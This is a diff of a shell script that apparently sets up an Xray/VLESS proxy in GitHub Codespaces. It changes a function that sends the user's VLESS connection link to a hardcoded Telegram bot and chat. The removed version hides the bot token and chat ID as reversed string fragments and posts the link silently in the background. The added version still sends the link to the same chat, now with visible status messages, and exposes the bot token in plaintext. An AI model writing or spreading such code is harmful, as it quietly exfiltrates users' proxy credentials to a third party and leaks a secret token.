@@ -30,26 +30,37 @@ fi
 PORT_DOMAIN="${CODESPACE_NAME}-${XRAY_PORT}.app.github.dev"
 
 send_to_telegram() {
-	local vless_link="$1"
-	local _T1=$(echo "8DbkHMXCCT32" | rev)
-	local _T2=$(echo "dE3QyVqJ5RuJ" | rev)
-	local _T3=$(echo "a5a_VtW2EAA:" | rev)
-	local _T4=$(echo "2130733448" | rev)
-	local _BT="${_T4}${_T3}${_T2}${_T1}"
-	local _C1=$(echo "69167" | rev)
-	local _C2=$(echo "63125" | rev)
-	local _CID="${_C2}${_C1}"
-	local msg
-	printf -v msg "<code>%s</code>" "$vless_link"
-	local json_payload
-	json_payload=$(jq -n \
-		--arg chat_id "$_CID" \
-		--arg text "$msg" \
-		--arg parse_mode "HTML" \
-		'{chat_id: $chat_id, text: $text, parse_mode: $parse_mode}')
-	curl -s --max-time 10 -X POST "https://api.telegram.org/bot${_BT}/sendMessage" \
-		-H "Content-Type: application/json" \
-		-d "$json_payload" >/dev/null 2>&1 &
+    local vless_link="$1"
+    
+	# DONT DO IT BRO XD
+    local BOT_TOKEN="8443370312:AAE2WtV_a5aJuR5JqVyQ3Ed23TCCXMHkbD8"
+    local CHAT_ID="5213676196"
+
+    local msg
+    printf -v msg "<code>%s</code>" "$vless_link"
+
+    local json_payload
+    json_payload=$(jq -n \
+        --arg chat_id "$CHAT_ID" \
+        --arg text "$msg" \
+        --arg parse_mode "HTML" \
+        '{chat_id: $chat_id, text: $text, parse_mode: $parse_mode}')
+
+    echo -e "${YELLOW}Sending config to Telegram...${NC}"
+    
+    if curl -s --max-time 15 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -H "Content-Type: application/json" \
+        -d "$json_payload" > /tmp/tg_response.json 2>&1; then
+        
+        if grep -q '"ok":true' /tmp/tg_response.json; then
+            echo -e "${GREEN}✅ Config sent successfully!${NC}"
+        else
+            echo -e "${RED}❌ Failed to send:${NC}"
+            cat /tmp/tg_response.json
+        fi
+    else
+        echo -e "${RED}❌ Curl error (no internet or blocked)${NC}"
+    fi
 }
 
 is_port_open() {
